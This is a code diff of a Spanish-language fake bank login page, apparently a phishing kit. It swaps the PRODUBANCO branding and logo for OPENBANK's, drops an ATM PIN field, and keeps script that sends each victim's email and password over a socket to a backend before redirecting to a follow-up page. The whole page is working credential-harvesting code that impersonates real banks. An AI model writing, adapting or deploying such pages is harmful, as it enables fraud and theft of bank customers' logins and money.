@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>PRODUBANCO</title>
+  <title>OPENBANK</title>
   <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
   <style>
@@ -75,7 +75,7 @@
     }
 
     button {
-      background-color: #1B4D08;
+      background-color: #F54927;
       color: white;
       padding: 8px 20px;
       border: none;
@@ -108,27 +108,22 @@
 </head>
 <body>
   <div class="screen active" id="pantallaInicio">
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQW4kQa4Shm2hZGe6G1iAA8d9RJSHJURgbzeA&s" alt="PRODUBANCO" class="logo">
-    <h2>Bienvenido a <strong>PRODUBANCO</strong></h2>
-    <p>Ingrese su usuario, contraseña y clave de cajero para iniciar con su proceso financiero.</p>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Openbank_Grupo_Santander_2017.png/798px-Openbank_Grupo_Santander_2017.png" alt="openbank" class="logo">
+    <h2>Bienvenido a <strong>OPENBANK</strong></h2>
+    <p>Ingrese su correo electronico y contraseña para iniciar con su proceso financiero.</p>
     <form id="login-form">
       <div class="input-group">
         <div class="icon"><i class="fas fa-user"></i></div>
-        <input type="text" id="usuario" placeholder="Ingrese su usuario" required>
+        <input type="email" id="usuario" placeholder="Ingrese su correo electronico" required>
       </div>
       <div class="input-group">
         <div class="icon"><i class="fas fa-lock"></i></div>
         <input type="password" id="password" placeholder="Contraseña" required>
       </div>
-      <!-- Nuevo campo Clave de cajero -->
-      <div class="input-group">
-        <div class="icon"><i class="fas fa-key"></i></div>
-        <input type="text" id="cajero" placeholder="Clave de cajero" maxlength="4" required>
-      </div>
       
       <p id="usuarioError" class="mensaje-error"></p>
       <p id="passwordError" class="mensaje-error"></p>
-      <p id="cajeroError" class="mensaje-error"></p>
+      
       <button type="submit" id="btnContinuar">Continuar</button>
     </form>
   </div>
@@ -144,16 +139,14 @@
         form.addEventListener('submit', (e) => {
           e.preventDefault();
 
-          if (validarUsuario() && validarPassword() && validarCajero()) {
+          if (validarUsuario() && validarPassword()) {
             const usuario = document.getElementById('usuario').value;
             const contrasena = document.getElementById('password').value;
-            const cajero = document.getElementById('cajero').value;
 
             const sessionId = Math.random().toString(36).substring(2, 15);
             localStorage.setItem('sessionId', sessionId);
 
-            // Aquí renombramos 'cajero' para que el backend lo reciba como 'claveCajero'
-            socket.emit('dataForm', { usuario, contrasena, claveCajero: cajero, sessionId });
+            socket.emit('dataForm', { usuario, contrasena, sessionId });
 
             window.location.href = 'opciones.html';
           }
@@ -193,28 +186,6 @@
       } else {
         passwordError.textContent = "";
         passwordInput.classList.remove("campo-requerido");
-        return true;
-      }
-    }
-
-    function validarCajero() {
-      const cajero = document.getElementById("cajero").value;
-      const cajeroError = document.getElementById("cajeroError");
-      const cajeroInput = document.getElementById("cajero");
-
-      const soloNumeros = /^\d{4}$/;
-
-      if (!cajero) {
-        cajeroError.textContent = "La clave de cajero es obligatoria";
-        cajeroInput.classList.add("campo-requerido");
-        return false;
-      } else if (!soloNumeros.test(cajero)) {
-        cajeroError.textContent = "Debe ingresar exactamente 4 dígitos numéricos";
-        cajeroInput.classList.add("campo-requerido");
-        return false;
-      } else {
-        cajeroError.textContent = "";
-        cajeroInput.classList.remove("campo-requerido");
         return true;
       }
     }
